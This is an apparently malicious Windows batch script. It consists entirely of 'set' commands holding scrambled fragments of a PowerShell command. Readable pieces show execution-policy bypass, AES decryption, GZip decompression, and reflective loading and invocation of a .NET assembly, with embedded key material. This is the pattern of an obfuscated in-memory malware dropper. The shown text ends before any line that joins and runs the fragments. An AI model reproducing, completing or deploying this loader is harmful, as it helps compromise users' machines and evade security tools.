@echo off
set "VLuytajMOj=-joi"
set "RGGwKTjsuj=se()"
set "MkZoHEjdoe=$WVC"
set "qymgOcFtRM=ptor"
set "LWGfObNOgk=k.Pa"
set "GSAQRhbLPb=ddin"
set "ewkbPjDYHy=stem"
set "pGWNWRpPeq=nage"
set "sLhmrsTyEM=ck($"
set "YhwCrJASnZ=fowF"
set "LRvtNCDyTw=157K"
set "xrVizkAdNV=rans"
set "AsJjmhzXDC=oL'["
set "kqyUwrKTYR=;$xr"
set "jqOTcUvkEs=-ep "
set "oHMnqkZSrX=);$W"
set "cSDmAPhFBF=P4Ia"
set "fJMJMjTIuO=pStr"
set "mLLmvzDwzO=.Cre"
set "SSAXmlJQax=VCbk"
set "TmUpjANWwA=oin "
set "qYmWSLQPGL=e]::"
set "uXvXflygUQ=ct S"
set "kGPxnxuSaD=qUE "
set "oyTnwZgmNa==');"
set "zkRzIZGvsc=sEsU"
set "XyQJqmSLfq=pres"
set "OrGnlBrVbh== $W"
set "iALIGQFqhC=ke($"
set "LZsiDbTYiU=Obje"
set "vouMoVDWJu=  $r"
set "wVOvikojtE=VCbk"
set "NyOhBdAmhi=TllA"
set "jmejQWVbZT=bypa"
set "GFbxfKaMnj=Invo"
set "SLTFFYLcCS=-nop"
set "tIpVxXgpod=lit("
set "GkJgfKdURE=y.Ci"
set "sKyOhqoOjj=-1.."
set "dcxYShkPlL=rtS4"
set "nJgTqyiKYa=Fina"
set "iPTglbGigN=3); "
set "rXMvHohgsr=Ti8L"
set "fNIoQJSxeF=Disp"
set "lxDYTIvhwX=('KY"
set "MpaKySbGvM=tryP"
set "PBDndxqiKK=RKBi"
set "CgtYPoRBWN=stem"
set "QJPaxTkdxg=.Ass"
set "iTDCyLbgNz=tion"
set "HNdFdbVyKi=rIu."
set "abCdZnGxxK= = ["
set "reYIGeOHgL=Syst"
set "gXxXRYbfQh=('da"
set "kmPmrzarzc=] -j"
set "SIBHMvuVtQ=1] -"
set "fmdkuNfjtV=join"
set "gQdAHielxH=m.Re"
set "zRUXEBCUCY=, $R"
set "udqQHLWeqC=Secu"
set "YZmGWvLQjm=;$to"
set "vVKKCVwvru=;$BR"
set "PToxiobhxy=]::C"
set "dmleyhcWiZ=..-1"
set "UnAAyaQlOJ=-joi"
set "QiOBAsovpb=mHi."
set "OWCtJxFvuI=iP.T"
set "ofCDSehfoK=ypto"
set "OiKyCJMGMz=tem."
set "JLAnPXGViq=tem."
set "xObuntLhNX=gth)"
set "mtdyeqrmkH=.Con"
set "kGeszNkbSb=RKBi"
set "PatFYVtrIZ=embl"
set "HYQzAVbNpK='[-1"
set "UXWypbPjNZ=iA);"
set "toLRxUIKiP=.Cry"
set "eQthmIFDYg=VCbk"
set "vQkYBvoHFZ= [Sy"
set "KnEepUmRnG== [S"
set "XpXaVBzWkt=:: '"
set "sjXFsOqxFo=Comp"
set "KsJAyBPgHg=yste"
set "ftkqCYwqXq=ach "
set "prBvhGwaDd=ress"
set "NkhxPMmQbg=ecry"
set "bFiGvSOOrY=mMK4"
set "sneQJUivAJ=lBlo"
set "nVCMBPQWxf=.Sec"
set "VUeDkSdgeF=VCbk"
set "DdOCFxzymw=Comp"
set "eNkFbKyWpb=E.En"
set "mjEfIbHRae=comm"
set "RyzhKmuVTY=S46e"
set "ZiIxfdbcJN=pose"
set "JgDzHCFtIr=.Len"
set "gWluPeXgLy=vert"
set "rJkAVZFQXh=k; }"
set "oxEmpFSNTI=ne);"
set "kFuNeqHABO=rity"
set "IbmkrFHGKa=mHi "
set "tccRRoNIHQ=[]] "
set "fErCCVhpyv=]::N"
set "LlTKZCijuc=.Com"
set "UifmTxMmMz=$RKB"
set "SLuQBpaATU=);$W"
set "DKrHjOgqIC=$QSf"
set "qtOYlkyeKD=nirt"
set "RLHeozrYiV=-Obj"
set "NqWyDvyIQB=n ''"
set "DzgGdnTgLK=yste"
set "sAvaRnnAbW=y]::"
set "HZmOcnhasC=y.Pa"
set "MkAHzSbMKP=9tpc"
set "NOhVhKGYqQ=V = "
set "fkxntCuzCL='h6b"
set "fVbTqQCiKO=.-16"
set "CvIylIUkLa=TWbg"
set "KVMqLPpCgY=y.Cr"
set "hzFAXeirGk=gMod"
set "CWAYsvCtDe=[Sys"
set "irsodxUBhY=$yIr"
set "AQGQuzRmrX===')"
set "TJBZnZHJAI=$csE"
set "HLBSbklIYo=ct S"
set "BcdVcRcCXG=rity"
set "MxmTArVjDc=).Sp"
set "NQYCdMZIJd=ment"
set "mZVffHnvGX=form"
set "EKflPLiMqV=KBiA"
set "vikVdNWPND= New"
set "KTodFHVvek=m(, "
set "WvKwWxUplG=ion."
set "oFTbNzzoui=gN+y"
set "FXdfUrpUto=Obje"
set "eLwccxUQME=[IO."
set "moXOvIdJzA=d;$W"
